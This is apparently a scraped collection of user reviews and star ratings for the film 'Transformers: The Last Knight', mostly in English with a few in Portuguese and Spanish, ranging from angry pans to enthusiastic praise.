""Eu sou f√£, quero service"" como diz o Borgo! F√£ quer ver eles transformando, quer ouvir o barulho da transforma√ß√£o, quer uma Hist√≥ria decente, quer persegui√ß√£o de carro, n√£o precisa ir para o espa√ßo n√£o, fica na Terra mesmo! Foi tosco! S√≥ para ter uma ideia do Non-sense, o cajado foi dado ao um Merlim b√™bado, porque ele foi l√° pedir a um ""cavalheiro transformer"" para derrotar seus inimigos. E se fosse mentira ? O cavalheiro transformer teria dado o cajado sem saber se o cara estava falando a verdade? Me poupe. E se o neg√≥cio era t√£o importante ia dar isso para um humano? Por favor! Aliena√ß√£o tem limite! Outra coisa, o cajado √© codificado para Merlim e para os descendentes. Ent√£o a criadora do Optimus Prime n√£o teria poder e tecnologia para reverter essa programa√ß√£o? Ela reprogramou o Optimus Prime caramba! Pensem, por favor! Aqui em casa eu reprogramo meu alarme! Um ser poderoso n√£o saberia reprogramar o tal cajado? Pode rodar com 50 cameras IMAX, se n√£o tem um roteiro que preste √© trabalho perdido. Pensem pelo amor de Deus. Foi feito s√≥ para cumprir tabela, n√£o tem paix√£o, n√£o tem amor pela franquia para escrever um filme correto que valha o ingresso. N√£o gastem seu dinheiro √† toa, assistam qualquer coisa menos esse filme! Vamos boicotar Michael Bay para tir√°-lo da franquia. Meu sonho √© ver Transformers by Christopher Nolan ou By JJ Abrams. A√≠ sim seria um filem digno. Pegar uma franquia e acabar com ela assim n√£o se faz! Ser√° que n√£o tem um filho de Deus para falar que o roteiro do filme estava ruim?

"I've been hoping to finishing blogging about the previous Bay/Transformers movies before posting this but I am falling behind schedule, so they'll have to wait for the time being. Damn all these sequels/reboots coming out! The latest, but I dare say, not the last of the Bay/Transformer franchise. You should be forgiven for forgetting, or getting confused about what has gone on before with stupid plot lines that entwine Earth's and Cybertron's history together. There are absolutely pointless characters and needless scenes that could have simply been cut away. Its unbalanced and overloaded, the Decepticon recruitment as an example, feeling like a copy from the character introductions from films like Guardians of the Galaxy and Suicide Squad; and these aren't even the Usual Suspects but some invented characters. Well, I recognise the name, Onslaught however they go to all that effort for them to mean absolutely nothing but to be canon fodder. Sir Anthony Hopkins' character and his odd cybertronian servant, Cogsworth spring into the franchise with little explanation as to why it's only now they make an appearance. Supposedly to protect a bigger secret than everything else the series has thrown at us. The only thing that peaks my interest regarding Hopkins, is why? Why would a seasoned actor such as Hopkins agree or, more intriguingly, want to star in such a mess. All of this just becomes more annoying and Cogsworth is like the love child of Jar Jar Binks and C3PO, if fact, he should have been named Cringeworth. All the characters, including the main bots and Wahlberg seem to flit in and out of the storyline to make way for the needless others. Izabella is almost get forgotten about until the ridiculous finale. Optimus Prime disappears, and Turturro has nothing short of a cameo appearance. Wahlberg as overprotective father ditches his daughter almost as fast than Bay did with Megan Fox with number 3 with a weak plot filler. I suppose I should be pleased that the story turns its attention to my beloved Great Britain. But no, instead they butcher the legend of King Arthur and Tucci (why Tucci?) turns Merlin into a blabbering drunk. Using Stonehenge makes it so cliched and ultimately corny! Yes, it's iconic but it's far from being the oldest or larger stone circle in England. Avebury would have been a better choice, plus being unconventional and possibly educational. But the proud British part of me ranting about a completely trivial matter. I totally understanding why it's Stonehenge and not Avebury. But either way, never have I been so upset that the myths of this country be perverted so badly. Jablonsky's score is just the same as what we're heard before. Which I suppose is consistent but there's nothing to comment about it, which is a shame because previously, he actually managed to compose interesting scores to the series whilst keeping in tune with the theme. The original cartoon was actually far more serious than this. What is Bay thinking? Does he even care? I can't say he's got lazy because all the usual high-octane action is there but maybe it's far too much! Or they got lost along the way and for the majority of the movie I kept thinking they're just making this up as they go along. This series has unfortunately, rapidly got worse with each instalment and I keep asking my 12 year old self, if I like it. And the answer is a clear no. I really wish it was the last knight and it ended here but there's a massive plot development that just convolutes everything. It's becoming over complicated with more moving myth than Prime's mechanics. Butchered and ridiculously weak story, it's already a disaster that's just getting worse. It's ran out of energon and needs to be put to rest.

"I love all the transformer movies, but this one has gained the #1 spot on my list",5
It was a perfect Saturday afternoon movie. The message of knights and integrity should be applauded and these movies are to be role models for kids to look up to and that is what they fulfill. Great cast and good plot line- I enjoyed it.,5
"Terrible movie, even expecting it to be a Bay Transformers no plot flick, it was painful to watch.",0.5
"I watched the new Transformers movie tonight and I don't think I'll watch another in the franchise for the simple reason that I don't want to stop loving a part of of my childhood. I hate that they (whoever they may be) made me almost hate Transformers. The directing by Michael Bay was, as usual, terrific especially if you liked the original movie in 2007 quite and surprisingly the lead role played by Wahlberg was good. but... I can't think of a movie in recent history that made such an effort to pander to the masses that went all the way from a token black kid straight through to the ""latin"" girl who dropped 2 lines in spanish with more of a gringo accent than me. Imagine Transformers meets Game Of Thrones meets Star Wars. (yes, there is an R2D2 like robot) I suggest you watch the first 10 minutes and then put it on fast forward until the Optimus prime speech 15 minutes before the end.. the good guys win so why ruin it with the details and waste the extra 2 hours p.s. If someone can explain how the kids are at all relevant in the movie other than introducing teenagers of different races let me know.",1.5
"This franchise has developed a disdain for moviegoers. The first movie is the only movie that seems to care about quality. This latest entry is the worst. Any movie in a series that does not correct previous mistakes is worse than the previous movie. There was an entire room of writers behind this movie. They had an entire room of people who either didn't care or didn't understand the material. The history of this franchise leans toward equal parts of both. This one was especially caustic because the advertising attempted to make the movie something it was not. It is not about female empowerment. It is not about kids on an adventure int eh world of Transformers. It is not about one hero rising to a task. It is not about Prime being evil. It is a movie that acknowledges and does not acknowledge previous franchise entries. This movie is the result of milking fan nostalgia, fan dedication and years of creative marketing. The result of not having to make a quality movie since the first entry. Anyone who says turn your brain off and enjoy the spectacle should be slapped. Paramount and all involved should be ashamed of this movie.",0.5
It was a good movie showing the background history of transformers. Wait until the end of the credits to see the cliff hanger. There will be another transformer movie.?,4
Why............ just.....why,0.5
"Tried twice to watch it, felt asleep both times within minutes. The first one was good as it was still somehow ""imaginable"" but now ....",1
Dark movie. Story line wasn't great but overall enjoyable.,4
"lamentable, pero no aprenden... siguen con lo mismo, una historia muy compleja, retorc√≠damente contada y con muchas cosas al mismo tiempo... los efectos, nada que decir",1.5
The most 'Michael Bay' film I have ever watched. Way overlong at 2.5 hours!,2
It could have been better but i liked it more than i expected. The plot it a bit thin and it got confusing but it was okay,3.5
Tried watching twice already fell asleep both times. Guess this is meant for a way younger audience. Would have been a more successful brand with out the overly comedic plots. I couldn't take anything serious. Had no connection.,2

the best transformers yet,5
"Just stop making these movies, please!",1
"Pretty much another Michael Bay movie in the line of Transformers, didn't disappoint but also didn't amaze at the same time. The story was hard to follow at times because it kept diverting too far off plot, actors could have been better and a lack luster performance from Mark Walbherg. As for the main scene at the end, it was disappointing could have been so much better and the editing wasnt amazing. Like I said didn't disappoint but didn't amaze.",3

Don't listen to the Hater's with there narrow minded and in some cases hidden agenda's. If you're a Transformers fan this movie will not disappoint! Every actor and actress delivered a solid performance. The action and special effects were amazing and anything but disappointing. No need rambling on throwing out movie facts to defend my opinion...this is simply my opinion so add it to the Peanut Gallery.,5
Not a great movie. Optimus disappears during the epic battle which is never explained. Never expect a great film but I love to see live action transformers,4
"Absolute shit. Sorry, but I wish this series would just end already. About as useful as a car with no wheels, engine, or body",0.5
You will like this if your a transformers fan so Yeh if your not stop complaining I don't get it it just shut up and watch 1-4,5
How can people hate this I don't get it,5
If you buy BluRay you get 40 minutes extra which shows Megatron and optimus in cybertron and there back story,5
Megatron should have had more fight scenes,5
5 stars its transformers you know that by now,5
Critics ruin every film I swear down,5
The best one is one and this Is second place,5
Optimus prime was just so good in this film and unicron yesssss,5
People hated this because they don't know who unicron is,5
Wasn't the best but it was wayyyyyyyy better than age of extinction,5
Amazing can't wait to see what they do next,5
"They keep doing the same thing with transformers over and over again and they just get worse every time. We have already seen the same shit multiple times and they just try and change up the story to try something new but it just ends up being dumb. I didn't really like the characters or any of the new transformers. At least it has lots of stuff blowing up and explosions. I'll give it credit for that. If you are bored and are working on a school project, have this running in the background but don't really watch it.",2.5
"This movie is like a big story put up in one paragraph with no punctuation marks whatsoever. Usually Transformers builds up a simple story that explodes into one big final battle, filled with special effects and epic fights between autobots and decepticons; pretty entertaining to watch, especially if you're into big explosions-action-robots-movies... and usually it works. ""The last knight"" is different from the beginning, it introduces way more storylines than it should, it tries to make a suspenseful plot with so many resources it just drags into a story that's full of holes and patches that it seems you're watching a lot of trailers from different movies with no connection between each other. The movie forces a lot of secondary roles (between the old and new characters) that it becomes boring and confusing at the same time. The main story becomes clear in the last quarter of the movie, just in time for the final battle...by this point you're in fully overdrive mode trying to catch up with everything that's happened that it's barely enjoyable. Personally I think that the worst part is the lack of continuity, they jump from one scene to another in less than 30 seconds. This ""dynamicity"" makes it impossible to follow the main plot or even one storyline. There are so many details and jumps between stories that it exhausting trying to connect the dots. I don't recommend it at all, not worth the money or time. Maybe if you're really curious or a big fan into the saga you may find it entertaining at some point, my only suggestion: lower your expectations, cause this is, by far, the worst Transformers movie.",0.5
transformers is the greatest movie in the history of great movies I loved the autobots ever since the first movie came out. I love it and can't wait to see the next movie because I feel that all the years of fighting the autobots need a to have a happy ending.,5
queue explosions and whirling alien cogs. pew pew pew pew LAME!!!,1
What could have been a terrific franchise Michael Bay may have destroyed for good. What moron keeps giving this guy's the reigns to make movies. Someone's mental capacity to make good judgement calls must have had brain trauma.,0.5
Demasiadas historias en una pel√≠cula que no desarrolla ninguna,2
"This film makes literally no sense, and squanders any remaining good will. How a film this long can feel like it's rushing its plot is a testament to Michael Bay's total lack of care for this film, and as it's his last one (again) he has ensured enough setup for part 6 so that nobody has a chance to make it any good- unless they decide, of course, to contradict what has gone before like EVERY TRANSFORMERS SEQUEL HAS DONE ANYWAY. A brighter tone, but still a total absence of fun.",1
I enjoyed this movie,5
worst movie in this franchise...they need to just let it go.,1
"I'm a big fan of transformers.....this one just destroyed the reputation and the legacy. So disappointed, it just shows that it really doesn't matter how much CGI you put into a movie because what really matters is the story line and this just doesn't have a story line. Complete mess.",0.5
They just can't tell a story correctly in these movies... not sure why ... and stop changing megaton's look ... never know when its him.,1
i like this film but sometimes it's boring. Anthony Hopkins and Mark Whalberg are fantastic. Though Michael Bay promised this is the last transformers film i think there will be another movie.,4
"A atrocious movie, michael bay has talent but this movies is just so bad",0.5
Ridiculous just ridiculous hopefully bays last one,1
I honestly didn't know what was going on the entire movie. The plot made no sense. Sad ending to the Transformers movies.,1.5
"While better than the last TF movie, it was still rushed. By the time the plot unfolded, there were too many explosions to measure.",3
Boycott movies made with Chinese money and influence. They use their money to make and point their guns at the rest of the world. They own Cinemark as well. Don't give your money over to them.,0.5
"It's a new Transformers movie. I expected a dumb story with great visuals and robots fighting each other. I got exactly that, but the one thing that makes it better then what people are leading you to think, is that the story is much better than the previous three installments. Although the 2nd act was very long and was cluttered with too many plot points, the 1st and 3rd act are extremely entertaining and fun to watch.",3
I really enjoyed the movie. I was told by so many people not to go see it but I am happy I did not listen. I loved the new characters and how they brought back old characters. I'm also a huge Mark Walburg fan. There is humor in the movie and the graphics alone make it worth seeing. Just go see it and enjoy what the movie has to offer instead of looking for what you have been told is bad about the movie.,5
It wasn't good but not great mark W made it boring this time around way to long to get to the action parts and then lack of them.,3
"5 star ratings are full of it. I went to see this movie with my wife and son. We seen all the movies in the theater. I loved transformers growing up and even loved the first movie. This movie was beyond horrible. Boring af for the first 2.5 hours. By the time the action actually started, I was done. I forced myself to watch the whole thing though. The story was weak with random characters thrown in the mix. I mean come on. This movie should of been 1.5 hours max. Never again. Just another Hollywood attempt to sell tickets just for the money. No heart went into the story or film. DO NOT WASTE YOUR TIME!!!",0.5
The Best Movie Of 2017. Wished it was a lot more longer though. But good actors awesome Cinematography and Special Effects And best script but similar to Revenge Of The Fallen,5
Critics trying to convince everyone not to watch it because its Micheal bay still make 600 million,5
"Transformers: The Last Knight is a flaming, lazy, unfinished mess. This is the perfect example of a film where it was short purely for a trailer with no other creative intention in mind. I would also like to clarify that I have enjoyed the first three films to a certain extent and I was hoping was something similar. Oh how I was totally ignorant. Before going into what made this movie a critical failure, there are a few pros in this film. The action scenes were ok to watch with some cool things occurring and interestingly designed sets. The transformers were fun to watch due to their cool designs and fun personalities, one dimensional, stereotypical and often poorly written personalities, but still fun and the most entertaining part of the film. Now that the pros are out of the way lets tackle the issues with Transformers: The Last Knight. The human actors in this film (except Anthony Hopkins because he can't do anything wrong) were boring, annoying, stereotypical, forgettable garbage and I couldn't care for them. Mark Wahlberg was blah, his love interest and relationship made no sense and was bleh, and the army guys had weird motivations and had little justification. The villains of the film had unexplained intentions and were just bad for the sake of bad. The kids in the film had zero reason to be there other than having cool trailer shots and flimsy reasons to push the protagonist. I think it could have been possible to have cut the kids from this film completely and it would not have affected anything what so ever but cut down the ridiculous 3 hour film time. To be quite frank, half the cast could have been cut and had no impact on the film what so ever. The plot of the film was stupid and convoluted and just incorporated random things for no real reason. Plot points either had little to no explanation or explained something so much that I lost complete interest and just started to watch the time tick on my phone. The pacing of this film jumped all over the place, rushing through the best scenes and going so slowly through the low impact scenes, that when the final fight came along I could not care at all about the fight and just sat and waited till the film was over. However, the worst part of the film in my opinion, was the technical aspects of the film. I could have forgiven most of the other things as long as they made it consistent on a technical level. This film was so lazily edited that it couldn't even keep the same aspect ratio for one minute of the film. It was so obvious that they used two different cameras and could not be stuffed to make the shots look the same even when they are in the same scene! It was also so obvious that they focused time on certain shots just for trailers where they left other shots and scenes almost untouched. The laziness in the CGI as well, with not that it looked bad, but how inconsistent they were. Watching the film for the first time I easily spotted many times where they had forgotten to CGI something in and where a placeholder was left in the final cut. This just proves to me that Michael Bay has no interest in the Transformers series and could not care about it at all. Ultimately, this film could have been 6.5/10 chicken nuggets if they had put more time into editing, focused more on the transformers, less focus on people and reduced the time of the film from a stupid three hours. However, since this film was so lazily made, it is 3/10 chicken nuggets. God have mercy on their souls.",1.5

"While it tries to be different with somewhat interesting ideas and somewhat enjoyable characters (contributing to the first half of the film being somewhat entertaining), the second half is a cluster-f*ck of boring loud action set pieces we've seen before, even with its impressive visuals, and moments of silliness and cringe. You get what you get with Transformers: The Last Knight. If you like these films, good for you; if you loathe them, then there's no reason for you to see it. As for me, The Last Knight is just as mediocre as the last two films (and certainly better than Revenge of the Fallen), but still not as entertaining as the first film. I think it's time that this series of films needs to end.",2.5
"Felt completely unsatisfied by this movie, while the action scenes and acting was as good as you would expect, the story just seemed pretty pointless - yet another 'thing' important to the Autobots and Decepticons that needs to be fought for, aren't all these stories the same! If you like action movies, I think you'll like this.",3.5
"I...I can't. It took me almost a month to actually come here and write about this piece of shit. I actually had to recover from watching this. It was actually a favor. I did it as a favor. A friend of mine wanted to watch it but he didn't want to watch it alone, so I agreed. Even though I know it is going to be shit, I thought I'd just sit through it and just watch it with low expectation. And by God, was that a mistake. It broke my low expectation. It broke my mind. Watching it for like almost 3 fking hours, I was speechless and dumbfounded. Broken is how my brain feel trying to digest whats on screen. I wanted to leave, I really do. But I just couldn't get my eyes of all that disaster that's happening. So, what went wrong? Well first of all, even before the movie itself started, we got fireballs coming into our faces. And then, explosion. Somehow, Bay managed to put in explosion in the Middle Age. By God, can you let us breathe and just..? I can't. You know what, screw the long of it. It is shit, garbage, even worse than garbage. I can't. Doesn't even deserve that 1/2 star but it doesn't allow me to give a ZERO. Bay, this shit better be your last. The Transformers franchise deserves a reboot or else should just stop at this point. Done.",0.5
Doesn't even have a storyline.,0.5
"First, the movie is over 3 hours long. You read that right. 3 hours and 9 minutes. Second, it's boring and all over the place. Characters are introduced that reoccur, and they have literally no place in the story except to maybe mess something up. Third, huge plot holes. One scene Optimus is in space, the next he's at the bottom of the ocean... convienient. Summary: too long for what it is, poor character development and introduction, and the overall story is awful.",1
I love the transformers movies and when Optimus prime and bumblebee Fight it made me speechless through the rest of the movie,5
nothing good about this movie,1
it was actin and great effects. I'm a transformer fan. Mark was GREAT,5
"gives what you should expect. A bit too long, much more than 2 hours.",3.5
This movie was awesome if you didnt watch any of the movies or cartoons then you wouldn't understand who unicron or the quintessons were but overall it was amazing.,5
Spectacular film I recommend you watch it,5
"It wasn't my favorite of the series, but it wasn't so bad I wish I never seen it. Lots of action, but I'm not sure making Mark the last knight really sold the story. I wish the last night was another character introduced, or just a better story line. It seemed kind of corny. Also the girl who works on bots seemed strange. Her role seemed pointless. Other than that it was decent. I think it's time to end a good thing before it's ruined like 'The Land before time'.",1.5
"Action was alright, wasn't interested in the story whatsoever.",2.5
"I tried to give this NO stars, but it wouldn't let me.",0.5
Dull and disjointed. Effect are a good as ever but story was awful,1
"The movie is pretty headachy, and it aIso has Absolutely AWFUL characters in the comedic roIes, but in the end The Last Knight is the most enjoyable of the series, and the new characters, mainly in Anthony Hopkins, do Take the FiIm in interesting directions that you wouldn't expect from a Transformers movie.",4
Amazing film Megatron was amazing,5
"I didn't see it, but knowing it exist is bad enough. Please don't reboot this garbage of a franchise.",0.5
"I finally must agree with the critics on this one. T:TLK truly rivals the very worst films ever. Is there even a total of one minute in the whole movie, where something isn't being said or done? Could it stop to breath just once? I guess it would be 4 hours if they didn't edit it the way they did. And how about the scene where each of Megatron's buddies had their names Branded across the screen? As if this whole thing was just a 2 1/2 hour toy commercial? I, only for the second time in my life, fell asleep in a theater.",1
It's getting worse and worse this franchise.,2
"Anyone who enjoyed the cartoons as a kid, should have no problem with this movie. If you expected an Oscar winning film or performances, you might want to reevaluate your ability to pick your movies. It's an action movie about robots, explosions and occasionally hot men and women...",2.5
"It is a fun, well paced movie that does exactly what it's meant to; entertain the audience with epic one liners, well scripted comic relief, (mostly) well positioned exposition, and enough of a plot to make it seem like you're watching something important. Although the plot is a bit weak, just like porn, you don't watch a transformers movie for the plot, and The Last Knight makes up for its thin plot with extraordinary set pieces. Fantastic throwbacks to what I consider the trilogy of Transformers films preceding The Age of Extinction, in the form of bringing back characters, locations and off hand comments referencing the events of that 'trilogy'. Overall does exactly what it should, however, the plot (although strong enough to make do) could do with some improvement. I would give it 4 stars but I need to make up for all the unfair reviews so I'm giving it 5.",5
To describe how much I despised it I'd have to shove a pole down my throat it made practically no sense and if this is what we have to expect from the so-called great director Michael Bay I am not watching anymore of his movies,0.5
all right fuck it I like the transformers movies except for revenge of the fallen which I think we can all agree was a total shitfest but my favorite transformers movie is age of extinction and I also like 1 and 3 but that being said this is not as good as transformers age of extinction was but this is a good movie and I'm excited for when it comes to bluray,4
excellent movie better than the previous one,5
It wasnt that bad. But NEVER EVER EVER put that little girl on a movie ever again,2
Great story. Interesting mix-up story that keeps you watching it til the end.,5
Mark Wahlberg in a robot movie fighting to save humanity... they should have stopped with the first one he was in. This movie didn't make much sense. The graphics were incredible but the storyline needs so much work. I liked the actor just not in this movie.,1
5 million more times better than age of extinction,5
Megatron vs optimus prime was short but brutal,5
Amazing film this started a new series,5
They keep getting worse and worse every time,0.5
Give me your ugly face lol!!!!!!! He said that to infernicus,5
Watch it watch it watch it tutututruuut,5
The best one out of all of them it's amazing,5
"Honestly, when I got to the theatre and got my unbuttered popcorn, I was expecting it to be a 1 star movie but, it was actually pretty decent! An action filling experience for the young youth. It's probably because I love technology, maybe that's why.",3.5
